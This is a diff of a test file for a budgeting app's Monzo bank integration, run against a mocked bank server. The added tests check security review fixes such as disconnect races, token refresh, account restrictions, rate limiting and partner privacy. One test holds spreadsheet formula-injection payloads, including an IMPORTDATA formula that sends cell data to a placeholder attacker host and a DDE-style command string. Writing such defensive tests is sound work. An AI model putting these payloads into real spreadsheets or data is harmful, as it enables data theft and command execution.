@@ -56,17 +56,22 @@ function monzoRoute(method, url, params) {
   const send = (code, body, headers) => ({code, body: JSON.stringify(body), headers: headers || {}});
   if (u.pathname === "/oauth2/token") {
     const f = params.payload || {};
+    if (monzo.tokenDown) return send(503, {code: "internal_service"});
     if (f.client_id !== CLIENT_ID || f.client_secret !== SECRET.clientSecret) return send(401, {code: "unauthorized.bad_client"});
     if (f.grant_type === "authorization_code") { if (f.code !== SECRET.code || f.redirect_uri !== "https://script.google.com/macros/s/TEST/exec") return send(400, {code: "bad_request"}); monzo.tokens[SECRET.access1] = true; monzo.refreshes[SECRET.refresh1] = SECRET.access2; return send(200, {access_token: SECRET.access1, refresh_token: SECRET.refresh1, expires_in: 21600, user_id: "user_00009ETHAN", client_id: CLIENT_ID, token_type: "Bearer"}); }
     if (f.grant_type === "refresh_token") { const next = monzo.refreshes[f.refresh_token]; if (!next) return send(401, {code: "unauthorized.bad_refresh_token"}); delete monzo.refreshes[f.refresh_token]; monzo.tokens[next] = true; const nextRef = f.refresh_token === SECRET.refresh1 ? SECRET.refresh2 : "ref-ETHAN-3-ffffffff"; monzo.refreshes[nextRef] = f.refresh_token === SECRET.refresh1 ? "acc-ETHAN-3-eeeeeeee" : "acc-ETHAN-4-gggggggg"; return send(200, {access_token: next, refresh_token: nextRef, expires_in: 21600, user_id: "user_00009ETHAN", client_id: CLIENT_ID, token_type: "Bearer"}); }
     return send(400, {});
   }
-  if (u.pathname === "/oauth2/logout") { delete monzo.tokens[tok]; return send(200, {}); }
+  if (u.pathname === "/oauth2/logout") { if (!monzo.tokens[tok]) return send(401, {code: "unauthorized.bad_access_token"}); delete monzo.tokens[tok]; return send(200, {}); }
   if (!monzo.tokens[tok]) return send(401, {code: "unauthorized.bad_access_token"});
-  if (monzo.rate) return send(429, {code: "too_many_requests"}, {"Retry-After": "120"});
+  if (monzo.rate) return send(429, {code: "too_many_requests"}, {"Retry-After": monzo.retryAfter || "120"});
   if (!monzo.approved) return send(403, {code: "forbidden.insufficient_permissions", message: "Access forbidden due to insufficient permissions"});
   // after the first few minutes Monzo only gives the last 90 days
-  if (monzo.historyClosed && u.pathname === "/transactions") { const sn = q.get("since"); if (!sn || (!/^tx_/.test(sn) && (NOW - RealDate.parse(sn)) > 90 * 86400000)) return send(403, {code: "forbidden.verification_required"}); }
+  // a slow page (pageDelay), and Monzo's 5 minutes running out after a few pages (closeAfter)
+  if (u.pathname === "/transactions") { monzo.txCalls = (monzo.txCalls || 0) + 1; if (monzo.pageDelay) NOW += monzo.pageDelay; if (monzo.closeAfter && monzo.txCalls > monzo.closeAfter) { monzo.historyClosed = true; monzo.strictCursor = true; } }
+  // strictCursor: carrying on from an old payment's id is refused too
+  const oldId = (sn) => { const t = monzo.txns.find(x => x.id === sn); return !!t && (NOW - RealDate.parse(t.created)) > 90 * 86400000; };
+  if (monzo.historyClosed && u.pathname === "/transactions") { const sn = q.get("since"); if (!sn || (/^tx_/.test(sn) ? monzo.strictCursor && oldId(sn) : (NOW - RealDate.parse(sn)) > 90 * 86400000)) return send(403, {code: "forbidden.verification_required"}); }
   if (u.pathname === "/ping/whoami") return send(200, {authenticated: true, client_id: CLIENT_ID, user_id: "user_00009ETHAN"});
   if (u.pathname === "/accounts") return send(200, {accounts: monzo.accounts});
   if (u.pathname === "/balance") return q.get("account_id") === "acc_00009main" ? send(200, monzo.balance) : send(404, {});
@@ -226,7 +231,7 @@ ok("pending payment imported", bk("tx_shell").amount === 30 && bk("tx_shell").bu
 ok("declined payment skipped", !bk("tx_declined"));
 ok("a payment to someone, nothing guessed", bk("tx_friend") && bk("tx_friend").budget === "" && bk("tx_friend").note === "SAM SMITH");
 ok("the hand-logged bakery is linked, not added again", !bk("tx_bakery") && tx.find(r => r.id === "app-bakery").bankId === "tx_bakery" && tx.find(r => r.id === "app-bakery").review === false);
-ok("the Peckish shop is linked, not added again", !bk("tx_sainsburys") && tx.find(r => r.id === "peckish-1").bankId === "tx_sainsburys" && tx.find(r => r.id === "peckish-1").review === false);
+ok("the Peckish shop is linked, not added again", !bk("tx_sainsburys") && tx.find(r => r.id === "peckish-1").bankId === "tx_sainsburys" && tx.find(r => r.id === "peckish-1").review === true);   // a Peckish estimate still asks the payer to check it
 ok("rent and the card-paid phone bill aren't payments (they're planned bills)", !bk("tx_rent") && !bk("tx_phone"));
 ok("money in from Sophie isn't spending", !bk("tx_sophie_bills") && !bk("tx_pay"));
 let ex = rows(F, "exceptions");
@@ -369,7 +374,7 @@ ok("Ethan's key can't see Sophie's bank", call({key: kE, action: "bank.status"})
 ok("Ethan can't map Sophie's Space", call({key: kE, action: "bank.map", extId: "goal-rent", account: "e-bills"}).ok === false);
 
 // ================= review fixes: squatted ids, Peckish, pending holds, payday ticks, history, stale phones =================
-const freshMonzo = () => { monzo.tokens = {}; monzo.refreshes = {}; monzo.rate = false; monzo.approved = true; monzo.historyClosed = false; };
+const freshMonzo = () => { monzo.tokens = {}; monzo.refreshes = {}; monzo.rate = false; monzo.approved = true; monzo.historyClosed = false; monzo.pageDelay = 0; monzo.closeAfter = 0; monzo.strictCursor = false; monzo.txCalls = 0; };
 // connect Monzo for Ethan in an environment, with the pots mapped
 const connectMonzo = (G, map) => {
   G.call({key: G.kE, action: "bank.monzo.setClient", clientId: CLIENT_ID, clientSecret: SECRET.clientSecret});
@@ -412,7 +417,8 @@ const grow = (G, t) => { G.c.CACHE_ = {}; return G.c.readTable_(t).rows; };
   ok("S4: Ethan's settings id is still his to use", G.call({key: G.kE, ops: [{op: "put", table: "settings", row: {id: "ethan:share.totals", person: "ethan", key: "share.totals", value: "true"}}]}).applied.length === 1);
   // C1: Sophie's half-split Peckish shop is the Sainsbury's Ethan's bank paid
   const shop = grow(G, "transactions").find(r => r.id === "t-pk-shop1");
-  ok("C1: a half-split Peckish shop links to whoever's bank paid it", shop.bankId === "tx_sainsburys" && shop.person === "ethan" && shop.account === "e-main" && shop.amount === 62.4 && shop.split === "half" && shop.review === false && !grow(G, "transactions").some(r => r.id === "bk-monzo-tx_sainsburys"), shop);
+  const bkS = grow(G, "transactions").find(r => r.id === "bk-monzo-tx_sainsburys");
+  ok("C1: a half-split Peckish shop the partner logged waits, unchanged, for the payer to check their bank payment", shop.person === "sophie" && !shop.bankId && shop.amount === 60 && shop.split === "half" && bkS && bkS.person === "ethan" && bkS.account === "e-main" && bkS.amount === 62.4 && bkS.split === "" && bkS.splitHint !== "half" && bkS.review === true, {shop, bkS});   // the partner's rows are never looked at
   // C2: a hold that goes to nothing, and one that disappears
   ok("C2: pending holds imported", grow(G, "transactions").some(r => r.id === "bk-monzo-tx_hold" && !r.deleted) && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_hold2" && !r.deleted));
   monzo.txns.find(t => t.id === "tx_hold").amount = 0;
@@ -502,6 +508,339 @@ const grow = (G, t) => { G.c.CACHE_ = {}; return G.c.readTable_(t).rows; };
   starling.feed = starling.feed.filter(f => f.feedItemUid !== "sfi-funspend");
 }
 
+// ================= second security review: disconnect races, real log-out, one Monzo user, own accounts only, no £0 =================
+{
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  ok("R2: connected for the race test", !!G.env.userProps.BANK_TOKEN_ethan);
+  // a refresh that's on its way when Ethan disconnects: the new token is never kept
+  const tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
+  const realFetch = G.c.UrlFetchApp.fetch;
+  G.c.UrlFetchApp.fetch = (url, params) => {
+    const r = realFetch(url, params);
+    if (/oauth2\/token/.test(url) && params.payload && params.payload.grant_type === "refresh_token") { G.c.UrlFetchApp.fetch = realFetch; G.c.bankDisconnect_("ethan"); }   // the tap lands mid-refresh
+    return r;
+  };
+  try { G.c.monzoRefresh_("ethan", tk); } catch (e) {}
+  G.c.UrlFetchApp.fetch = realFetch;
+  ok("R2: a refresh that finishes after a disconnect isn't saved", !G.env.userProps.BANK_TOKEN_ethan && !G.env.userProps.BANK_TOKEN_NEXT_ethan && !G.env.userProps.BANK_CLIENT_ethan);
+  ok("R2: and its new session is ended at Monzo", Object.keys(monzo.tokens).length === 0, Object.keys(monzo.tokens));
+  ok("R2: status says disconnected", G.call({key: G.kE, action: "bank.status"}).bank.connected === false);
+}
+{
+  // disconnecting with an expired token still logs out at Monzo (refresh first, then log out)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan); delete monzo.tokens[tk.access];   // the access token has expired at Monzo
+  const before = reqs.length;
+  ok("R3: disconnect works", G.call({key: G.kE, action: "bank.disconnect"}).ok === true && !G.env.userProps.BANK_TOKEN_ethan);
+  const after = reqs.slice(before).map(r => r.method + " " + new URL(r.url).pathname);
+  ok("R3: an expired token is refreshed, then logged out", after.indexOf("post /oauth2/token") >= 0 && after.lastIndexOf("post /oauth2/logout") > after.indexOf("post /oauth2/token") && Object.keys(monzo.tokens).length === 0, after);
+}
+{
+  // reconnecting with a different Monzo account is turned away
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  ok("R6: the Monzo user is remembered", JSON.parse(G.env.userProps.BANK_TOKEN_ethan).userId === "user_00009ETHAN");
+  const s0 = JSON.parse(G.env.props.BANK_STATUS_ethan); s0.needsReconnect = true; G.env.props.BANK_STATUS_ethan = JSON.stringify(s0);
+  const st = new URL(G.call({key: G.kE, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
+  const realFetch = G.c.UrlFetchApp.fetch;
+  G.c.UrlFetchApp.fetch = (url, params) => { const r = realFetch(url, params); if (/oauth2\/token/.test(url) && params.payload.grant_type === "authorization_code") { const j = JSON.parse(r.getContentText()); j.user_id = "user_SOMEONEELSE"; const t = JSON.stringify(j); return {getResponseCode: () => 200, getContentText: () => t, getHeaders: () => ({})}; } return r; };
+  const o = G.c.doGet({parameter: {code: SECRET.code, state: st}}), h = o.getContent ? o.getContent() : o.text; responses.push(h);
+  G.c.UrlFetchApp.fetch = realFetch;
+  ok("R6: a different Monzo account is turned away", /different Monzo account/.test(h) && JSON.parse(G.env.userProps.BANK_TOKEN_ethan).userId === "user_00009ETHAN", h);
+  ok("R6: and the owner is told", G.env.mail.some(m => /different Monzo account/.test(m.body)));
+}
+{
+  // a joint account and Flex stay out; one with no balance isn't saved as £0
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const keepAcc = monzo.accounts, keepBal = monzo.balance;
+  monzo.accounts = keepAcc.concat([{id: "acc_joint", description: "joint", type: "uk_retail_joint", closed: false}]);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const ask = reqs.filter(r => /\/accounts\?/.test(r.url)).pop();
+  const listed = G.call({key: G.kE, action: "bank.status"}).bank.accounts.map(a => a.extId);
+  ok("R4: Budgie asks Monzo for personal accounts only, and a joint account is left out", ask && /account_type=uk_retail/.test(ask.url) && listed.indexOf("acc_joint") < 0, {ask: ask && ask.url, listed});
+  monzo.balance = {currency: "GBP"}; NOW += 86400000; G.call({key: G.kE, action: "bank.syncNow"});
+  const today = new Intl.DateTimeFormat("en-CA", {timeZone: "Europe/London"}).format(new RealDate(NOW));
+  ok("R8: no balance from the bank: no £0 valuation", !grow(G, "valuations").some(v => v.id === "bk-acc_00009main-" + today));
+  monzo.accounts = keepAcc; monzo.balance = keepBal;
+}
+
+{
+  // one lock for the phone and the poll: the owner's user lock (a web app gets no document lock, as in real Apps Script)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const used = [], L0 = () => ({waitLock: () => {}, tryLock: () => true, releaseLock: () => {}});
+  let busy = false;
+  G.c.LockService = {getScriptLock: L0, getDocumentLock: () => null, getUserLock: () => ({tryLock: () => { used.push("user"); return !busy; }, waitLock: () => {}, releaseLock: () => {}})};
+  NOW += 31000; G.call({key: G.kE, action: "bank.syncNow"}); G.c.bankPoll();
+  ok("R2b: the phone's sync and the 15-minute poll take the same lock", used.length >= 2 && used.every(x => x === "user"), used);
+  // a busy lock when Monzo sends you back keeps the sign-in, so reloading the page finishes it
+  const s0 = JSON.parse(G.env.props.BANK_STATUS_ethan); s0.needsReconnect = true; G.env.props.BANK_STATUS_ethan = JSON.stringify(s0);
+  const st = new URL(G.call({key: G.kE, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
+  busy = true; let o = G.c.doGet({parameter: {code: SECRET.code, state: st}}); busy = false;
+  ok("R2b: a busy moment doesn't use up the sign-in", /busy/.test(o.getContent ? o.getContent() : o.text) && !!G.env.userProps["BANK_OAUTH_" + st]);
+  o = G.c.doGet({parameter: {code: SECRET.code, state: st}});
+  ok("R2b: and opening it again connects", /connected to Monzo/.test(o.getContent ? o.getContent() : o.text));
+}
+
+// ================= third security review =================
+{
+  // P1: a partner can't use a made-up "Peckish" shop to find out about the other's private bank payments
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv();
+  const pkS = JSON.parse(Buffer.from(G.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
+  // with her own Budgie key: any id, source "peckish", split half, aimed at Ethan's payment to a friend (£20 on 6 Nov)
+  const p1 = G.call({key: G.kS, ops: [{op: "put", table: "transactions", row: {id: "probe-1", date: "2026-11-06", person: "sophie", amount: 21, budget: "s-food", account: "s-main", split: "half", note: "Sam Smith", source: "peckish"}}]});
+  // with her Peckish key: a shop with a made-up name, aimed at Ethan's £18 Deliveroo
+  const p2 = G.call({key: pkS, ops: [{op: "put", table: "transactions", row: {id: "t-pk-probe2", date: "2026-11-01", person: "sophie", amount: 17, budget: "s-food", account: "s-main", split: "half", note: "Groceries", source: "peckish"}}]});
+  // a real shared shop: Sophie logs the Tesco shop in Peckish, Ethan's card paid it
+  const p3 = G.call({key: pkS, ops: [{op: "put", table: "transactions", row: {id: "t-pk-tesco", date: "2026-11-01", person: "sophie", amount: 44, budget: "s-food", account: "s-main", split: "half", note: "Tesco big shop", source: "peckish"}}]});
+  ok("P1: the probes were saved", p1.applied.length === 1 && p2.applied.length === 1 && p3.applied.length === 1, [p1, p2, p3]);
+  const S = phone(G, G.kS); S.sync();
+  connectMonzo(G, {acc_00009main: "e-main"});
+  const t1 = grow(G, "transactions"), r1 = t1.find(r => r.id === "probe-1"), r2 = t1.find(r => r.id === "t-pk-probe2"), r3 = t1.find(r => r.id === "t-pk-tesco");
+  ok("P1: a row Peckish didn't make is never linked to the partner's bank payment", r1.person === "sophie" && !r1.bankId && r1.amount === 21 && t1.some(r => r.id === "bk-monzo-tx_friend" && r.person === "ethan"), r1);
+  ok("P1: a Peckish shop that doesn't name the same shop isn't linked either", r2.person === "sophie" && !r2.bankId && r2.amount === 17 && t1.some(r => r.id === "bk-monzo-tx_deliveroo"), r2);
+  const e3 = t1.find(r => r.id === "bk-monzo-tx_tesco");
+  ok("P1: a real shared shop is matched to whoever's bank paid it", r3.person === "sophie" && !r3.bankId && r3.amount === 44 && e3 && e3.person === "ethan" && e3.amount === 45.2 && e3.review === true, {r3, e3});
+  ok("P1: and nothing of the partner's shop is carried onto it", e3.split === "" && e3.splitHint !== "half", e3);
+  S.sync();
+  const sees = JSON.stringify(S.T.transactions || []);
+  ok("P1: so the partner's phone never learns the payer's amount", !/45\.2/.test(sees) && !(S.T.transactions || []).some(r => r.person === "ethan" && !r.deleted), (S.T.transactions || []).filter(r => r.person === "ethan"));
+  ok("P1: and keeps its own copy of the shop, unchanged, until then", (S.T.transactions || []).some(r => r.id === "t-pk-tesco" && !r.deleted && r.amount === 44) && (S.T.transactions || []).some(r => r.id === "probe-1" && r.amount === 21), (S.T.transactions || []).filter(r => /tesco|probe/.test(r.id)));
+  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", split: "half", review: false}}]}); NOW += 15 * 60000; G.c.bankPoll(); S.sync();
+  ok("P1: once the payer confirms it as split, the partner sees it beside her own shop (nothing of hers is touched)", (S.T.transactions || []).some(r => r.id === "bk-monzo-tx_tesco" && r.split === "half" && r.amount === 45.2 && !r.deleted) && (S.T.transactions || []).some(r => r.id === "t-pk-tesco" && !r.deleted));
+}
+
+{
+  // P2: two reads refreshing at once (each refresh token works once at Monzo): the second uses what the first saved
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const tk0 = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
+  const a = G.c.monzoRefresh_("ethan", tk0);
+  let b = null, err = null; try { b = G.c.monzoRefresh_("ethan", tk0); } catch (e) { err = e.message; }
+  ok("P2: a refresh that lost the race uses the token the other one saved", b && b.access === a.access && !err, {err});
+  // P3: Monzo having a bad moment when refreshing isn't a broken connection
+  G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(JSON.parse(G.env.userProps.BANK_TOKEN_ethan), {expiresAt: NOW - 1}));
+  monzo.tokenDown = true; NOW += 15 * 60000; G.c.bankPoll(); monzo.tokenDown = false;
+  let sp = G.call({key: G.kE, action: "bank.status"}).bank;
+  ok("P3: a 5xx from Monzo's sign-in server doesn't ask for a reconnect", !sp.needsReconnect && /problem/.test(sp.lastError), sp);
+  NOW += 15 * 60000; G.c.bankPoll(); sp = G.call({key: G.kE, action: "bank.status"}).bank;
+  ok("P3: and the next poll carries on", sp.connected && !sp.lastError, sp);
+}
+
+{
+  // P4: a disconnect that lands just before a refreshed token is saved still wins, even if the lock doesn't hold
+  // (whether a web app's user lock is shared with the triggers isn't documented)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
+  const up = G.c.PropertiesService.getUserProperties; let armed = true;
+  G.c.PropertiesService.getUserProperties = () => { const st = up(), set = st.setProperty; st.setProperty = (k, v) => { if (armed && k === "BANK_TOKEN_ethan") { armed = false; G.c.bankDisconnect_("ethan"); } return set(k, v); }; return st; };
+  let err = ""; try { G.c.monzoRefresh_("ethan", tk); } catch (e) { err = e.message; }
+  G.c.PropertiesService.getUserProperties = up;
+  ok("P4: the refreshed token isn't kept after the disconnect", !armed && !G.env.userProps.BANK_TOKEN_ethan && !G.env.userProps.BANK_TOKEN_NEXT_ethan && /disconnected/.test(err), {err, tok: !!G.env.userProps.BANK_TOKEN_ethan});
+  ok("P4: and its new session is ended at Monzo", Object.keys(monzo.tokens).length === 0, Object.keys(monzo.tokens));
+  ok("P4: the poll doesn't bring it back", (NOW += 15 * 60000, G.c.bankPoll(), G.call({key: G.kE, action: "bank.status"}).bank.needsSetup === true));
+  // a new connection afterwards works as normal
+  connectMonzo(G, {acc_00009main: "e-main"});
+  ok("P4: connecting again afterwards works", G.call({key: G.kE, action: "bank.status"}).bank.connected === true);
+  G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(JSON.parse(G.env.userProps.BANK_TOKEN_ethan), {expiresAt: NOW - 1}));
+  NOW += 15 * 60000; G.c.bankPoll();
+  ok("P4: and its refreshes are kept", G.call({key: G.kE, action: "bank.status"}).bank.connected === true && JSON.parse(G.env.userProps.BANK_TOKEN_ethan).expiresAt > NOW);
+}
+
+{
+  // P5: mapping a pot doesn't rewrite the bank's status (a read finishing at that moment can't lose what it saved),
+  // and the next read still goes back 89 days
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  NOW += 15 * 60000; G.c.bankPoll();
+  const before = G.env.props.BANK_STATUS_ethan;
+  NOW += 60000; ok("P5: map", G.call({key: G.kE, action: "bank.map", extId: "pot_bills", account: "e-bills"}).ok === true);
+  ok("P5: the status isn't rewritten by bank.map", G.env.props.BANK_STATUS_ethan === before);
+  const n0 = reqs.length; NOW += 15 * 60000; G.c.bankPoll();
+  const sinceOf = (from) => reqs.slice(from).filter(r => /\/transactions\?/.test(r.url) && /since=20/.test(r.url)).map(r => Math.round((NOW - RealDate.parse(decodeURIComponent(r.url.match(/since=([^&]+)/)[1]))) / 86400000));
+  ok("P5: the read after mapping goes back 89 days", sinceOf(n0)[0] === 89, sinceOf(n0));
+  ok("P5: and the pot move comes in", grow(G, "moves").some(m => m.id === "bk-monzo-tx_potbills" && m.to === "e-bills"));
+  const n1 = reqs.length; NOW += 15 * 60000; G.c.bankPoll();
+  ok("P5: then back to 35 days", sinceOf(n1)[0] === 35, sinceOf(n1));
+}
+
+{
+  // P6: "Check now" can't be used to burn the owner's daily allowance of requests
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  NOW += 60000; const a = G.call({key: G.kE, action: "bank.syncNow"}), n0 = reqs.length;
+  const b = G.call({key: G.kE, action: "bank.syncNow"});
+  ok("P6: a second Check now straight away is turned away without asking the bank", a.ok && b.ok === false && /moment ago/.test(b.error) && reqs.length === n0, {a, b, n: reqs.length - n0});
+  NOW += 31000; ok("P6: and works again half a minute later", G.call({key: G.kE, action: "bank.syncNow"}).ok === true);
+}
+
+{
+  // P7: a shop name from the bank that looks like a formula goes into the sheet as text (new rows and changed ones)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
+  const evil = '=IMPORTDATA("https://evil.example/?d="&A1)';
+  monzo.txns = monzoData(planned).concat([mtx("tx_evil", "2026-11-10", -1234, {merchant: merchant(evil, "shopping"), category: "shopping"}), mtx("tx_evil2", "2026-11-11", -999, {counterparty: {name: " +cmd|' /C calc'!A0"}, category: "general"})]);
+  const G = bankEnv(), sent = [];
+  ["transactions", "moves", "valuations", "exceptions"].forEach(t => { const sh = G.env.sheets[t], gr = sh.getRange; sh.getRange = (...a) => { const r = gr(...a), sv = r.setValues; r.setValues = (v) => { v.forEach(row => row.forEach(x => sent.push(x))); return sv(v); }; return r; }; });
+  connectMonzo(G, {acc_00009main: "e-main"});
+  ok("P7: bank names that look like formulas are written as text", sent.indexOf("'" + evil) >= 0 && sent.indexOf(evil) < 0 && sent.some(x => /^' \+cmd/.test(String(x))) && !sent.some(x => /^\s*[=+@]/.test(String(x))), sent.filter(x => /IMPORT|cmd/.test(String(x))));
+}
+
+// ================= fourth security review =================
+{
+  // Q1: a partner posting many made-up Peckish shops (one shop name, an amount a penny apart each) must not learn which
+  // one the other's bank paid: nothing about her own shops may change until the payer confirms the split
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv();
+  const pkS = JSON.parse(Buffer.from(G.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
+  const probes = []; for (let a = 4400; a <= 4640; a += 10) probes.push({op: "put", table: "transactions", row: {id: "t-pk-q" + a, date: "2026-11-01", person: "sophie", amount: a / 100, budget: "s-food", account: "s-main", split: "half", note: "Tesco Sainsbury Aldi Lidl Deliveroo Uber Amazon", source: "peckish"}});
+  const pr = G.call({key: pkS, ops: probes});
+  ok("Q1: the probes were saved", pr.applied.length === probes.length, pr.rejected);
+  const S = phone(G, G.kS); S.sync();
+  const mineBefore = JSON.stringify(grow(G, "transactions").filter(r => /^t-pk-q/.test(r.id)).map(r => [r.id, r.person, r.amount, r.split, r.deleted, r.bankId || ""]));
+  connectMonzo(G, {acc_00009main: "e-main"});
+  const after = grow(G, "transactions"), mineAfter = JSON.stringify(after.filter(r => /^t-pk-q/.test(r.id)).map(r => [r.id, r.person, r.amount, r.split, r.deleted, r.bankId || ""]));
+  ok("Q1: none of the partner's shops changes when the payer's bank is read", mineBefore === mineAfter, {mineBefore: mineBefore.slice(0, 200), changed: after.filter(r => /^t-pk-q/.test(r.id) && (r.person !== "sophie" || r.bankId || r.deleted)).map(r => r.id)});
+  const view = () => JSON.stringify((S.T.transactions || []).filter(r => /^t-pk-q/.test(r.id)).map(r => [r.id, r.person, r.amount, r.split, !!r.deleted]).sort());
+  const v0 = view(); S.sync();
+  ok("Q1: and her phone sees no difference in them, nor any payment of the payer's", v0 === view() && !(S.T.transactions || []).some(r => r.person === "ethan" && !r.deleted), view().slice(0, 300));
+  const e = after.find(r => r.id === "bk-monzo-tx_tesco");
+  ok("Q1: the payer's own bank row asks whether to split it", e && e.person === "ethan" && e.review === true && e.splitHint !== "half" && e.split === "" && e.amount === 45.2, e);   // nothing taken from her shops
+  // the payer confirms it as shared: the partner's matching shop goes, and the payer's bank payment takes its place
+  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", split: "half", review: false}}]});
+  NOW += 15 * 60000; G.c.bankPoll();
+  const t2 = grow(G, "transactions"), gone = t2.filter(r => /^t-pk-q/.test(r.id) && r.deleted === true).map(r => r.id);
+  ok("Q1: once confirmed, none of her shops is touched either", gone.length === 0, gone);
+  S.sync();
+  ok("Q1: and the partner then sees the payer's split payment", (S.T.transactions || []).some(r => r.id === "bk-monzo-tx_tesco" && r.split === "half" && r.amount === 45.2));
+  // the payer says it wasn't shared: the partner's shops stay as they are
+  const G2 = bankEnv(); freshMonzo(); monzo.txns = monzoData(planned);
+  const pk2 = JSON.parse(Buffer.from(G2.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
+  G2.call({key: pk2, ops: [{op: "put", table: "transactions", row: {id: "t-pk-solo", date: "2026-11-01", person: "sophie", amount: 45, budget: "s-food", account: "s-main", split: "half", note: "Tesco", source: "peckish"}}]});
+  connectMonzo(G2, {acc_00009main: "e-main"});
+  G2.call({key: G2.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", split: "", review: false}}]});
+  NOW += 15 * 60000; G2.c.bankPoll();
+  const solo = grow(G2, "transactions").find(r => r.id === "t-pk-solo");
+  ok("Q1: confirmed as not shared: the partner's shop is left alone", solo.person === "sophie" && !solo.deleted && solo.amount === 45 && !solo.bankId, solo);
+}
+
+{
+  // Q2: a first import of years of history against a sheet that already has years of payments stays quick: each bank
+  // payment is only compared with the rows from a few days either side (Apps Script stops a run after 6 minutes, and
+  // Monzo only gives the whole history for 5 minutes, so a slow first import would lose it)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
+  const G = bankEnv(t => { for (let i = 0; i < 1500; i++) t.transactions.push({id: "old" + i, date: B.addDays("2026-10-25", -(i % 900)), person: i % 2 ? "ethan" : "sophie", amount: 3 + (i % 40), budget: i % 2 ? "e-fun" : "s-food", account: i % 2 ? "e-main" : "s-main", note: "Shop " + (i % 30)}); });
+  const data = {provider: "monzo", accounts: [{extId: "acc_00009main", name: "M", kind: "main", balance: 1}], txns: []};
+  for (let i = 0; i < 3000; i++) data.txns.push({id: "tx_q2_" + i, acc: "acc_00009main", date: B.addDays("2026-11-16", -Math.floor(i * 0.6)), amount: 1 + (i % 57), pending: false, declined: false, name: "Shop " + (i % 30), category: "general", pot: "", card: true, load: false});
+  const D0 = G.c.Budgie, real = D0.parseDate; let n = 0; D0.parseDate = (x) => { n++; return real(x); };
+  const t0 = RealDate.now(); G.c.CACHE_ = {}; const res = G.c.bankApply_("ethan", data, ""); const ms = RealDate.now() - t0;
+  D0.parseDate = real;
+  ok("Q2: a big first import compares each payment only with nearby rows", n < 20000 && ms < 20000 && res.added > 2000, {parseDate: n, ms, res});
+}
+
+{
+  // Q3: a first read of years of history that's slow stops in good time, keeps what it read, and carries on a minute
+  // later from where it got to; if Monzo's 5 minutes run out part-way, what was read is kept, with the last 90 days
+  const bigHistory = () => { const l = []; for (let i = 0; i < 1000; i++) l.push(mtx("tx_big" + String(i).padStart(4, "0"), B.addDays("2024-01-01", i), -(100 + i), {merchant: merchant("Corner Shop", "general"), category: "general"})); return l.concat(monzoData(planned)); };
+  const bigRows = (G) => grow(G, "transactions").filter(r => /^bk-monzo-tx_big/.test(r.id));
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = bigHistory(); monzo.pageDelay = 30000;
+  let G = bankEnv(); const t0 = NOW; connectMonzo(G); const took = NOW - t0;
+  let st = JSON.parse(G.env.props.BANK_STATUS_ethan);
+  ok("Q3: a slow first read stops in good time (Apps Script stops a run at 6 minutes) and keeps what it read", took < 5 * 60000 && bigRows(G).length === 800 && !st.fullDone && st.cursor && /^tx_big0799$/.test(st.cursor.acc_00009main) && G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"), {took, n: bigRows(G).length, st: {fullDone: st.fullDone, cursor: st.cursor}});
+  const n0 = reqs.length; NOW += 60000; G.c.bankPendingImports(); st = JSON.parse(G.env.props.BANK_STATUS_ethan);
+  const firstAsk = reqs.slice(n0).find(r => /\/transactions\?/.test(r.url));
+  ok("Q3: a minute later it carries on from there", firstAsk && /since=tx_big0799/.test(firstAsk.url) && bigRows(G).length === 1000 && new Set(bigRows(G).map(r => r.id)).size === 1000 && st.fullDone && !st.cursor && !G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"), {url: firstAsk && firstAsk.url, n: bigRows(G).length, fullDone: st.fullDone});
